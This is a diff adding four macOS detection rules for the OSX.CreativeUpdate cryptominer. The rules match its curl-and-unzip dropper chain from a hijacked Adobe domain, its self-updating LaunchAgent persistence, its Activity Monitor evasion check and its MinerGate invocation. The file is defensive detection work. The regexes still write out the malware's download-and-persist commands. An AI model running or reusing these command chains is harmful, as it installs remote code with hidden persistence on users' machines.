@@ -3231,3 +3231,103 @@ PythonSelfDecompressingExec:
       technique_name: "Deobfuscate/Decode Files or Information"
       tactics: ["Defense Evasion"]
 
+CreativeUpdateFakeUpdateDropperChain:
+  title: "OSX.CreativeUpdate trojanized-app dropper install chain"
+  id: "creativeupdate-dropper-chain-001"
+  status: "experimental"
+  description: "Detects the exact Platypus-built install chain embedded in the Resources/script of OSX.CreativeUpdate's trojanized app bundles (fake Firefox/OnyX/Deeper DMGs distributed via a compromised MacUpdate.com in Feb 2018): curl-fetch mdworker.zip from the hijacked legitimate Adobe domain public.adobecc.com, unzip it into ~/Library, then move its bundled MacOSupdate.plist into ~/Library/LaunchAgents. Confirmed verbatim in the 'script' resource inside the Firefox 58.0.2.dmg sample's Firefox.app/Contents/Resources."
+  references:
+    - "https://objective-see.org/blog/blog_0x29.html"
+    - "https://www.malwarebytes.com/blog/news/2018/02/new-mac-cryptominer-distributed-via-a-macupdate-hack"
+  author: Doug Metz
+  date: 2026-07-23
+  logsource:
+    category: file_event
+    product: macos
+  detection:
+    strings:
+      - "curl -o ~/Library/mdworker\\.zip https://public\\.adobecc\\.com/files/[A-Za-z0-9]+\\?content_disposition=attachment && unzip -o ~/Library/mdworker\\.zip -d ~/Library && mkdir -p ~/Library/LaunchAgents && mv ~/Library/mdworker/MacOSupdate\\.plist ~/Library/LaunchAgents"
+  falsepositives: []
+  level: high
+  tags:
+    - attack.t1105
+  mitre:
+    - technique_id: "T1105"
+      technique_name: "Ingress Tool Transfer"
+      tactics: ["Command and Control"]
+
+CreativeUpdateSelfUpdatingLaunchAgentChain:
+  title: "OSX.CreativeUpdate self-updating persistence LaunchAgent"
+  id: "creativeupdate-selfupdate-launchagent-001"
+  status: "experimental"
+  description: "Detects the ProgramArguments shell chain of OSX.CreativeUpdate's MacOSupdate LaunchAgent (Label: MacOSupdate, ~/Library/LaunchAgents/MacOSupdate.plist): it unloads and deletes a second plist (MacOS.plist), re-downloads a fresh copy of that same plist from public.adobecc.com, reloads it, then relaunches the miner at ~/Library/mdworker/mdworker. This lets the attacker push updated persistence/config without touching the original LaunchAgent. Confirmed verbatim in the MacOSupdate.plist bundled inside mdworker.zip."
+  references:
+    - "https://objective-see.org/blog/blog_0x29.html"
+    - "https://www.malwarebytes.com/blog/news/2018/02/new-mac-cryptominer-distributed-via-a-macupdate-hack"
+  author: Doug Metz
+  date: 2026-07-23
+  logsource:
+    category: file_event
+    product: macos
+  detection:
+    strings:
+      - "launchctl unload -w ~/Library/LaunchAgents/MacOS\\.plist && rm -rf ~/Library/LaunchAgents/MacOS\\.plist && curl -o ~/Library/LaunchAgents/MacOS\\.plist https://public\\.adobecc\\.com/files/"
+  falsepositives: []
+  level: high
+  tags:
+    - attack.t1543.001
+  mitre:
+    - technique_id: "T1543.001"
+      technique_name: "Create or Modify System Process: Launch Agent"
+      tactics: ["Persistence"]
+
+CreativeUpdateActivityMonitorEvasion:
+  title: "OSX.CreativeUpdate Activity Monitor detection evasion loop"
+  id: "creativeupdate-activitymonitor-evasion-001"
+  status: "experimental"
+  description: "Detects the watchdog loop in OSX.CreativeUpdate's mdworker shell script: it polls the process list every 5 seconds and unloads its own MacOS.plist LaunchAgent the instant Activity Monitor is running, then reloads it once the miner process (sysmdworker) is no longer found — hiding the cryptominer from a user who opens Activity Monitor to check CPU usage. Confirmed verbatim in the top-level 'mdworker' script inside mdworker.zip."
+  references:
+    - "https://objective-see.org/blog/blog_0x29.html"
+    - "https://www.malwarebytes.com/blog/news/2018/02/new-mac-cryptominer-distributed-via-a-macupdate-hack"
+  author: Doug Metz
+  date: 2026-07-23
+  logsource:
+    category: file_event
+    product: macos
+  detection:
+    strings:
+      - "ps aux \\| grep \"Activity Monitor\" \\| grep -v grep > /dev/null"
+  falsepositives: []
+  level: high
+  tags:
+    - attack.t1622
+  mitre:
+    - technique_id: "T1622"
+      technique_name: "Debugger Evasion"
+      tactics: ["Defense Evasion"]
+
+CreativeUpdateMinerGateInvocation:
+  title: "OSX.CreativeUpdate mdworker MinerGate cryptomining invocation"
+  id: "creativeupdate-minergate-invocation-001"
+  status: "experimental"
+  description: "Detects OSX.CreativeUpdate launching its renamed MinerGate CLI miner (installed at ~/Library/mdworker/mdworker or sysmdworker) with an attacker-controlled email as the mining-pool login and the -xmr (Monero) flag — the exact invocation form used across its LaunchAgent variants (MacOSupdate, GoogleSoftwareUpdateAgent). Confirmed verbatim in the GoogleSoftwareUpdateAgent.plist bundled in the 1UQIRIV2MJHGD2F3D2H403W31RTFFF.zip sample, which hardcodes '-user walker18@protonmail.ch -xmr'."
+  references:
+    - "https://objective-see.org/blog/blog_0x29.html"
+    - "https://www.malwarebytes.com/blog/news/2018/02/new-mac-cryptominer-distributed-via-a-macupdate-hack"
+  author: Doug Metz
+  date: 2026-07-23
+  logsource:
+    category: file_event
+    product: macos
+  detection:
+    strings:
+      - "~/Library/mdworker/mdworker -user \\S+@\\S+ -xmr"
+  falsepositives: []
+  level: high
+  tags:
+    - attack.t1496
+  mitre:
+    - technique_id: "T1496"
+      technique_name: "Resource Hijacking"
+      tactics: ["Impact"]
+
